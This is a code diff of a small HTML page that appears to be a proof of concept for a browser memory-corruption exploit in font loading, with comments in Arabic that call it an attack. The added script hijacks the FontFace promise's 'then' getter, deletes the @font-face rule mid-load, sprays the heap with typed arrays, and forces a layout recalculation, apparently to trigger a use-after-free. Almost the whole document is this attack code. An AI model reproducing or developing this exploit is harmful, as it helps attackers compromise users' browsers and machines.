@@ -1,27 +1,40 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
-    <style>
-        @font-face {
-            font-family: 'TargetFont';
-            src: url('data:font/woff2;base64,d09GMgABAAAAA');
-        }
-        #box { font-family: 'TargetFont'; }
+    <style id="s">
+        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
     </style>
 </head>
 <body>
-    <div id="box">Exploitation Target</div>
-    <script>
-        // إجبار المتصفح على محاولة عرض العنصر (هذا يجبر الـ Pump)
-        document.body.offsetTop;
-        
-        // استخدام MutationObserver لمراقبة متى سيبدأ المحرك في معالجة الخط
-        const target = document.getElementById('box');
-        const observer = new MutationObserver((mutations) => {
-            // بمجرد أن يكتشف النظام الـ Font، سنقوم بالهجوم فوراً
-            console.log("Font state changed");
-        });
-        observer.observe(target, { attributes: true });
-    </script>
+<script>
+window.onload = () => {
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    let fired = false;
+    let spray = []; // مصفوفة الحشو
+
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+                // الهجوم المدمج
+                document.getElementById('s').sheet.deleteRule(0);
+                
+                // عملية الحشو (Spray) في لحظة حذف القاعدة
+                for (let i = 0; i < 1000; i++) {
+                    spray.push(new Uint32Array(32)); 
+                }
+                
+                document.body.offsetTop; // إجبار المحرك على إعادة الحساب
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+};
+</script>
 </body>
 </html>
